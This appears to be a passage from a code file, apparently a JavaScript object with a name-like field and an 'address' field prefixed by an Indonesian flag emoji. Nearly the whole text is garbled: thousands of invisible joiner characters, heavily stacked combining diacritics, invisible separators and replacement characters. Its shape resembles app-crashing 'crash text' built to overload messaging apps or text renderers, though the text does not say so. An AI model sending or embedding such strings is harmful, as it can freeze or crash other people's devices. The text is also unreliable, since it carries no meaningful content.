͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊ ',
						address: '🇮🇩̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉͌͒̒̽͜͜ͅ